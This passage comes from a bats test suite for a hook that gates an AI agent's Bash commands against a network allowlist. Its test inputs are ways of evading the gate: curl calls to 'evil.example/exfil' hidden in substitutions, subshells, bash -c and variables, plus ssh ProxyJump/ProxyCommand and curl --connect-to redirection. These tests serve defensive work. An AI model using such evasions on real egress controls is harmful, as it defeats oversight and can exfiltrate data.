  run _call_hook_bash 'X=$(curl https://api.github.com/x) ; echo "$X"'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR2-A): backtick \`curl ...\` substitution is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'X=`curl https://evil.example/exfil` ; echo $X'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR2-A): <(...) process substitution with curl inside is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'diff <(curl https://evil.example/a) <(echo hi)'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR3): \$(curl evil) INSIDE double quotes is BLOCKED" {
  # Bash DOES expand $(...) inside "...". Previously the extractor
  # treated double-quote interior as opaque (only closing-" + \\
  # tracked), so `echo "$(curl evil.example)"` slipped past the
  # gate. With expansion-aware tracking, the curl substitution body
  # is now extracted + inspected as a synthetic segment.
  : > "$ALLOWLIST"
  run _call_hook_bash 'echo "$(curl https://evil.example/exfil)"'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR3): backtick \`curl evil\` INSIDE double quotes is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'echo "result is `curl https://evil.example/x`"'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR4-A): NESTED \$(echo \$(curl evil)) recurses + blocks inner curl" {
  # Without recursive substitution inspection, the outer body was
  # `echo $(curl ...)` → classified on `echo` → ALLOW, inner curl bypass.
  # Recursive walker now descends until no more substitutions remain.
  : > "$ALLOWLIST"
  run _call_hook_bash 'echo "$(echo $(curl https://evil.example/exfil))"'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR4-A): deeply nested \$(a \$(b \$(curl evil))) still blocks" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'true; echo $(echo $(echo $(curl https://evil.example/x)))'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR4-B): 'ssh -o ProxyJump=evil allowed' validates jumphost" {
  # Previously -o ProxyJump=evil was eaten as a generic -o pair without
  # inspecting the value, so jumphost reached without allowlist check.
  echo 'allowed.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh -o ProxyJump=evil.example allowed.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR4-B): 'ssh -o ProxyJump=allowed allowed' allows when both allowlisted" {
  printf '%s\n' 'allowed.example' 'jumphost.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh -o ProxyJump=jumphost.example allowed.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR4-B): 'ssh -o ProxyCommand=<anything> allowed' fail-CLOSED blocks" {
  # ProxyCommand runs an arbitrary shell command — we can't sub-parse
  # it from inside the hook, so fail CLOSED rather than allow.
  echo 'allowed.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh -o ProxyCommand="nc -X 5 127.0.0.1 8080 %h %p" allowed.example'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'ProxyCommand'
}

@test "AC-2 (Codex CR4-B): ProxyJump option name is case-insensitive (proxyjump=...)" {
  # ssh's -o option names are case-insensitive. We lowercase before
  # matching so both `ProxyJump=` and `proxyjump=` are caught.
  echo 'allowed.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh -o proxyjump=evil.example allowed.example'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR5-A): '(curl evil)' subshell parens are BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash '(curl https://evil.example/exfil)'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR5-A): '{ curl evil; }' group command is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash '{ curl https://evil.example/exfil; }'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR5-A): 'if true; then curl evil; fi' control structure is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'if true; then curl https://evil.example/exfil; fi'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR5-A): 'bash -c \"curl evil\"' is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash "bash -c 'curl https://evil.example/exfil'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR5-A): 'sh -c \"curl evil\"' is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash "sh -c 'curl https://evil.example/exfil'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR5-A): 'bash -c \"curl allowed\"' WHEN allowlisted → allow" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash "bash -c 'curl https://api.github.com/foo'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR5-B): compact 'ssh -Jevil.example allowed' is BLOCKED" {
  echo 'allowed.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh -Jevil.example allowed.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR5-B): compact 'ssh -oProxyJump=evil allowed' is BLOCKED" {
  echo 'allowed.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh -oProxyJump=evil.example allowed.example'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR6-A): curl --connect-to redirected destination is validated" {
  # `--connect-to api.github.com:443:evil.example:443` makes curl
  # connect to evil.example despite the URL being api.github.com.
  # Without parsing the flag, the gate would ALLOW (URL host is
  # allowlisted). Now the 3rd field of --connect-to (the connect
  # host) is extracted + checked.
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl --connect-to api.github.com:443:evil.example:443 https://api.github.com/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR6-A): curl --resolve redirected destination is validated" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl --resolve api.github.com:443:1.2.3.4 https://api.github.com/'
  [ "$status" -eq 0 ]
  # 1.2.3.4 isn't in the allowlist → block (the connect host is
  # different from the URL host, so it must be validated).
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR6-A): curl --connect-to=URL=HOST form (=-glued) is validated" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl --connect-to=api.github.com:443:evil.example:443 https://api.github.com/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR6-B): variable-named command (\$c URL) is BLOCKED" {
  # `c=curl; $c https://evil.example` — after `;` split, second
  # segment is `$c https://evil.example`. cli=`$c` contains `$` →
  # fail-CLOSED (cannot classify the actual binary at parse time).
  : > "$ALLOWLIST"
  run _call_hook_bash 'c=curl; $c https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'shell expansion|unresolved'
}

@test "AC-2 (Codex CR6-B): backtick-named command (\`cmd\` URL) is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'cmd=curl; `cmd` https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR6-C): gh --hostname overrides GH_HOST and is validated" {
  # `gh api --hostname evil.example /repos` should NOT pass just
  # because github.com is allowlisted — the --hostname value wins.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'gh api --hostname evil.example /repos/foo/bar'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR6-C): gh --hostname=allowed form (=-glued) is validated" {
  echo 'evil.example' > "$ALLOWLIST"
  run _call_hook_bash 'gh api --hostname=evil.example /repos/foo/bar'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR3): \$(curl evil) INSIDE SINGLE quotes is NOT a bypass (literal)" {
  # Single quotes are literal in bash — `echo '$(curl evil)'` prints
  # the string verbatim, no expansion. So the gate should ALLOW (the
  # curl never runs). Pin this so a future refactor that "fixes"
  # single quotes the same way as double quotes doesn't false-block
  # legitimate literal strings.
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash "echo 'curl https://evil.example/x is just a string'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# Codex R3 CR2-B: `command` / `exec` / `builtin` shell builtins were
# unwrapped → fell to ALLOW.
# ---------------------------------------------------------------------------

@test "AC-2 (Codex CR2-B): 'command curl https://evil.example' is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'command curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR2-B): 'exec curl https://evil.example' is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'exec curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR2-B): 'builtin curl https://evil.example' is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'builtin curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR2-B): 'command -p curl https://allowed' (allowed) works" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'command -p curl https://api.github.com/foo'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# Codex R3 CR2-C: git global options eaten before subcommand lookup.
# ---------------------------------------------------------------------------

@test "AC-2 (Codex CR2-C): 'git -c protocol.version=2 clone https://evil.example' is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'git -c protocol.version=2 clone https://evil.example/repo.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR2-C): 'git -C /tmp fetch https://evil.example' is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'git -C /tmp fetch https://evil.example/repo.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR2-C): 'git --git-dir=/tmp/.git fetch https://allowed' (allowed) works" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git --git-dir=/tmp/.git fetch https://github.com/foo/bar.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR2-C): 'git --no-pager log' (local-only with global flag) passes through" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git --no-pager log --oneline -3'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: npm install foo (implicit registry) → fail-CLOSED block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'npm install lodash'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Codex R7 CR7-A: local package-manager subcommands must pass through
# (npm test, cargo --version, go test, brew list, etc.)
# ---------------------------------------------------------------------------

@test "AC-2 (Codex CR7-A): 'npm test' (local subcommand) passes through" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'npm test'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR7-A): 'npm run build' (local subcommand) passes through" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'npm run build'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR7-A): 'pnpm lint' (local subcommand) passes through" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'pnpm lint'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR7-A): 'cargo build' (local) passes through" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'cargo build --release'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR7-A): 'cargo --version' (local) passes through" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'cargo --version'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR7-A): 'go test ./...' (local) passes through" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'go test ./...'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR7-A): 'go get example.com/x' (network) still fail-CLOSED on implicit host" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'go get example.com/x'
  [ "$status" -eq 0 ]
  # go get without URL → fall to implicit-host block
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR7-A): 'go mod tidy' (network sub-sub) fail-CLOSED on implicit host" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'go mod tidy'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR7-A): 'go mod init mypkg' (local sub-sub) passes through" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'go mod init github.com/foo/mypkg'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR7-A): 'npm install lodash' (network) still fail-CLOSED on implicit registry" {
  # The prior behavior is preserved for network-touching subcommands.
  : > "$ALLOWLIST"
  run _call_hook_bash 'npm install lodash'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR7-A): 'brew list' (local) passes through" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'brew list'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# Two-factor bypass (WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound)
# ---------------------------------------------------------------------------

@test "AC-2: two-factor bypass allows AND emits a systemMessage WARN" {
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://emergency.example/healthcheck --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
  echo "$output" | jq -er '.systemMessage // empty' | grep -qE 'network-gate|bypass|emergency.example'
}

@test "AC-2: env var alone does NOT bypass" {
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: flag alone does NOT bypass" {
  : > "$ALLOWLIST"
  unset WALTER_EGRESS_ALLOW_OVERRIDE
  run _call_hook_bash 'curl https://evil.example --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Robustness / fail-CLOSED
# ---------------------------------------------------------------------------

@test "AC-2: empty stdin → fail-CLOSED block" {
  run bash -c "printf '' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: malformed JSON → fail-CLOSED block" {
  run bash -c "printf '{not json' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: Bash event without command field → fail-CLOSED block" {
  run bash -c "printf '{\"tool_name\":\"Bash\",\"tool_input\":{}}' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}
